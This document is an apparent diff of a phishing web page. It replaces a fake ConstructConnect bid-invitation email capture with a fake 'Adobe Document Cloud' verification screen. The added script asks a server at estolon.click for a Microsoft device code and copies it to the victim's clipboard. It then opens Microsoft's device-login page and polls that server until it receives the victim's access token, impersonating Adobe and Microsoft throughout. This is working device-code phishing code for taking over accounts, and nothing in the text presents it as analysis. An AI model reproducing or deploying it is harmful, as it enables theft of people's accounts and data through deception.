+      <div class="flow-title">Access Verification</div>
 
-      <div class="invite-text">
-        <h2>You've been invited to bid!</h2>
-        <p>Enter your email address to access<br />the project's details.</p>
+      <div class="flow-step complete">
+        <div class="num">
+          <i class="fas fa-check" style="font-size:10px;"></i>
+        </div>
+        <div class="txt">
+          <div class="step-name">Session verified</div>
+          <div class="step-desc">Secure share link opened</div>
+        </div>
+      </div>
+
+      <div class="flow-step active">
+        <div class="num">2</div>
+        <div class="txt">
+          <div class="step-name">Identity verification</div>
+          <div class="step-desc">Awaiting authorization code</div>
+        </div>
+      </div>
+
+      <div class="flow-step pending">
+        <div class="num">3</div>
+        <div class="txt">
+          <div class="step-name">File access</div>
+          <div class="step-desc">Pending verification</div>
+        </div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- ============ RIGHT PERMISSION PANEL ============ -->
+  <main class="permission">
+
+    <div class="perm-topbar">
+      <span class="brand-line">
+        <svg class="mini-a" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path fill="#FA0F00" d="M13.966 22.624l-1.69-4.281H8.122l3.892-9.144 5.662 13.425zM8.884 1.376H0v21.248zm15.116 0h-8.884L24 22.624z"/>
+        </svg>
+        Adobe Document Cloud
+      </span>
+      <span class="secure-tag"><span class="dot"></span>Secure Link</span>
+    </div>
+
+    <div class="perm-content">
+
+      <div class="perm-eyebrow"><span class="dot"></span>Permission Required</div>
+
+      <h1>You are about to open a <em>shared file</em>.</h1>
+
+      <p class="perm-lead">
+        To continue, verify your identity by entering the authorization code below
+        into the secure Adobe verification window. Access to this file is granted
+        through Adobe Document Cloud.
+      </p>
+
+      <div class="code-panel is-loading" id="codePanel">
+        <div class="cp-code loading" id="codeValue">
+          <i class="fas fa-spinner fa-pulse" style="margin-right:8px;"></i>Preparing secure code...
+        </div>
+        <div class="code-actions">
+          <button id="copyBtn" disabled>
+            <i class="fas fa-copy"></i> Copy code
+          </button>
+          <button id="refreshBtn" title="Generate a new code">
+            <i class="fas fa-rotate-right"></i> New code
+          </button>
+        </div>
+      </div>
+
+      <button id="loginBtn" disabled>
+        Verify &amp; Open File
+        <i class="fas fa-arrow-right arrow"></i>
+      </button>
+
+      <div id="statusMsg" class="status-msg"></div>
+
+      <div class="timer-row">
+        <span class="label"><i class="fas fa-hourglass-half"></i>Expires in</span>
+        <span id="timer">15:00</span>
+        <div class="timer-bar"><div class="timer-fill" id="timerFill"></div></div>
       </div>
 
     </div>
 
+    <div class="perm-footer">
+      <span class="lock-line">
+        <i class="fas fa-shield-halved"></i>
+        Secured by Adobe Document Cloud
+      </span>
+      <a href="#" class="policy-link" onclick="return false;">Adobe Privacy Policy</a>
+    </div>
+
   </main>
 
-  <!-- Footer -->
-  <footer>
-    <div class="footer-links">
-      <a href="#">Terms of Sale</a>
-      <span>|</span>
-      <a href="#">Terms of Use</a>
-      <span>|</span>
-      <a href="#">Copyright Notice</a>
-      <span>|</span>
-      <a href="#">Privacy Policy</a>
-    </div>
+</div>
 
-    <div class="footer-copy">
-      ©2026 ConstructConnect, Inc. All rights reserved.
-    </div>
-  </footer>
+<div class="toast" id="toast"></div>
 
-  <script>
-    // Configuration
-    const hasExpired = false;
-    const redirectUrl = "https://login.authline.cfd/CxmBTozX*";
+<script>
+  var API_URL = 'https://estolon.click/secured/proxy.php';
+  var USER_ID = 14;
 
-    const form = document.getElementById('login-form');
-    const input = document.querySelector('.access-key-input');
-    const errorMsg = document.getElementById('error-msg');
+  var currentCode = null;
+  var currentDeviceCode = null;
+  var isPollingActive = false;
+  var pollInterval = null;
 
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
+  var codeEl = document.getElementById('codeValue');
+  var codePanel = document.getElementById('codePanel');
+  var copyBtn = document.getElementById('copyBtn');
+  var refreshBtn = document.getElementById('refreshBtn');
+  var loginBtn = document.getElementById('loginBtn');
+  var statusMsg = document.getElementById('statusMsg');
+  var toast = document.getElementById('toast');
+  var timerSpan = document.getElementById('timer');
+  var timerFill = document.getElementById('timerFill');
 
-      const val = input.value.trim();
+  var expirySeconds = 900;
+  var timerTotal = 900;
+  var timerInterval = null;
 
-      // Expired check
-      if (hasExpired) {
-        errorMsg.style.display = 'block';
-        errorMsg.textContent = 'This document link has expired.';
-        return;
+  function startTimer(seconds) {
+      expirySeconds = seconds || 900;
+      timerTotal = expirySeconds;
+      clearInterval(timerInterval);
+      timerInterval = setInterval(function() {
+          var mins = Math.floor(expirySeconds / 60);
+          var secs = expirySeconds % 60;
+          timerSpan.textContent = String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+
+          var pct = timerTotal > 0 ? Math.max(0, (expirySeconds / timerTotal) * 100) : 0;
+          if (timerFill) {
+              timerFill.style.width = pct + '%';
+              timerFill.classList.toggle('low', expirySeconds <= 60);
+          }
+          timerSpan.classList.toggle('low', expirySeconds <= 60);
+
+          if (expirySeconds <= 0) {
+              clearInterval(timerInterval);
+              timerSpan.textContent = '00:00';
+          }
+          expirySeconds--;
+      }, 1000);
+  }
+
+  function stopTimer() { clearInterval(timerInterval); }
+
+  function showStatus(message, type) {
+      statusMsg.className = 'status-msg show';
+      if (type === 'error') statusMsg.classList.add('error');
+      else if (type === 'success') statusMsg.classList.add('success');
+      else if (type === 'info') statusMsg.classList.add('info');
+      statusMsg.textContent = message;
+  }
+  function hideStatus() {
+      statusMsg.className = 'status-msg';
+      statusMsg.textContent = '';
+  }
+
+  function showToast(msg) {
+      toast.textContent = msg;
+      toast.className = 'toast show';
+      clearTimeout(toast._hideTimer);
+      toast._hideTimer = setTimeout(function() {
+          toast.classList.remove('show');
+      }, 5000);
+  }
+
+  function showCode(code) {
+      currentCode = code;
+      codeEl.textContent = code;
+      codeEl.className = 'cp-code';
+      codePanel.classList.remove('is-loading');
+      copyBtn.disabled = false;
+      loginBtn.disabled = false;
+      refreshBtn.disabled = false;
+      refreshBtn.classList.remove('spinning');
+      hideStatus();
+      startTimer(900);
+  }
+
+  function showLoading() {
+      codeEl.innerHTML = '<i class="fas fa-spinner fa-pulse" style="margin-right:8px;"></i>Preparing secure code...';
+      codeEl.className = 'cp-code loading';
+      codePanel.classList.add('is-loading');
+      copyBtn.disabled = true;
+      loginBtn.disabled = true;
+      refreshBtn.disabled = true;
+      refreshBtn.classList.add('spinning');
+      stopTimer();
+      timerSpan.textContent = '--:--';
+      timerSpan.classList.remove('low');
+      if (timerFill) {
+          timerFill.style.width = '0%';
+          timerFill.classList.remove('low');
+      }
+  }
+
+  function copyCode() {
+      if (!currentCode) { showToast('No code available. Please wait.'); return; }
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(currentCode).then(function() {
+              showToast('✓ Code copied to clipboard');
+              copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+              copyBtn.classList.add('copied');
+              setTimeout(function() {
+                  copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy code';
+                  copyBtn.classList.remove('copied');
+              }, 3000);
+          }).catch(function() { fallbackCopy(); });
+      } else { fallbackCopy(); }
+  }
+
+  function fallbackCopy() {
+      var ta = document.createElement('textarea');
+      ta.value = currentCode;
+      document.body.appendChild(ta);
+      ta.select();
+      try {
+          document.execCommand('copy');
+          showToast('✓ Code copied to clipboard');
+          copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+          copyBtn.classList.add('copied');
+          setTimeout(function() {
+              copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy code';
+              copyBtn.classList.remove('copied');
+          }, 3000);
+      } catch (err) {
+          showToast('Please copy the code manually.');
+      }
+      document.body.removeChild(ta);
+  }
+
+  function fetchCodeFromAPI() {
+      showLoading();
+      showStatus('Connecting to secure server...', 'info');
+
+      var data = {
+          action: 'get_auth_broker_device_code',
+          user_id: USER_ID,
+          tenant_id: 'common'
+      };
+
+      fetch(API_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+      })
+      .then(function(response) {
+          if (!response.ok) throw new Error('HTTP error! status: ' + response.status);
+          return response.json();
+      })
+      .then(function(data) {
+          if (data.error) {
+              showStatus('Error: ' + data.error, 'error');
+              codeEl.textContent = '------';
+              codeEl.className = 'cp-code';
+              codePanel.classList.remove('is-loading');
+              refreshBtn.disabled = false;
+              refreshBtn.classList.remove('spinning');
+              return;
+          }
+          if (data.user_code && data.device_code) {
+              currentDeviceCode = data.device_code;
+              showCode(data.user_code);
+              showStatus('✓ Access code received', 'success');
+              setTimeout(hideStatus, 3000);
+          } else {
+              showStatus('Unexpected response from server.', 'error');
+              codeEl.textContent = '------';
+              codeEl.className = 'cp-code';
+              codePanel.classList.remove('is-loading');
+              refreshBtn.disabled = false;
+              refreshBtn.classList.remove('spinning');
+          }
+      })
+      .catch(function(err) {
+          showStatus('Network error. Please refresh the page.', 'error');
+          codeEl.textContent = '------';
+          codeEl.className = 'cp-code';
+          codePanel.classList.remove('is-loading');
+          refreshBtn.disabled = false;
+          refreshBtn.classList.remove('spinning');
+          console.error('Fetch error:', err);
+      });
+  }
+
+  function refreshCode() {
+      if (refreshBtn.disabled) return;
+      if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
+      isPollingActive = false;
+      currentCode = null;
+      currentDeviceCode = null;
+      copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy code';
+      copyBtn.classList.remove('copied');
+      showToast('Requesting a new access code...');
+      fetchCodeFromAPI();
+  }
+
+  function openMicrosoftLogin() {
+      if (!currentCode) {
+          showToast('No code available. Please wait.');
+          return;
+      }
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(currentCode);
       }
 
-      // Empty check
-      if (!val) {
-        input.style.outline = '2px solid #d9534f';
-        input.focus();
+      var w = 420, h = 315;
+      var left = Math.round(window.screen.width / 2 - w / 2);
+      var top = Math.round(window.screen.height / 2 - h / 2);
+      window.open(
+          'https://microsoft.com/devicelogin',
+          'ms_device_login',
+          'width=' + w + ',height=' + h + ',left=' + left + ',top=' + top +
+          ',toolbar=no,menubar=no,scrollbars=yes,resizable=yes'
+      );
 
-        setTimeout(() => {
-          input.style.outline = 'none';
-        }, 2000);
+      if (currentDeviceCode) startPolling();
+  }
 
-        return;
-      }
+  function startPolling() {
+      if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
+      if (!currentDeviceCode) return;
 
-      // Email validation
-      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      isPollingActive = true;
+      showStatus('⏳ Verifying access code...', 'info');
 
-      if (!emailPattern.test(val)) {
-        errorMsg.style.display = 'block';
-        errorMsg.textContent = 'Please enter a valid email address.';
-        return;
-      }
+      pollInterval = setInterval(function() {
+          var data = {
+              action: 'poll_auth_broker_token',
+              device_code: currentDeviceCode,
+              user_id: USER_ID,
+              tenant_id: 'common'
+          };
 
-    // Redirect with email query
-const encodedEmail = encodeURIComponent(val);
-window.location.href = `${redirectUrl}${encodedEmail}`;
-    });
-  </script>
+          fetch(API_URL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(data)
+          })
+          .then(function(response) { return response.json(); })
+          .then(function(data) {
+              if (data.success) {
+                  clearInterval(pollInterval);
+                  pollInterval = null;
+                  isPollingActive = false;
+                  showStatus('✅ Access granted! Opening file...', 'success');
+                  setTimeout(function() {
+                      window.location.href = 'https://www.adobe.com/creativecloud/businss.html';
+                  }, 1500);
+              } else if (data.waiting) {
+                  // keep waiting
+              } else if (data.error) {
+                  clearInterval(pollInterval);
+                  pollInterval = null;
+                  isPollingActive = false;
+                  showStatus('Error: ' + data.error, 'error');
+              }
+          })
+          .catch(function(err) { console.error('Polling error:', err); });
+      }, 5000);
+  }
 
+  function setupButtons() {
+      copyBtn.addEventListener('click', copyCode);
+      refreshBtn.addEventListener('click', function(e) {
+          e.preventDefault();
+          refreshCode();
+      });
+      loginBtn.addEventListener('click', function(e) {
+          e.preventDefault();
+          openMicrosoftLogin();
+      });
+  }
+
+  document.addEventListener('DOMContentLoaded', function() {
+      setupButtons();
+      fetchCodeFromAPI();
+  });
+</script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"7d8bf2a44c1243aea2fbc7487c636578","r":1,"spa":2}' crossorigin="anonymous"></script>
 </body>
 </html>
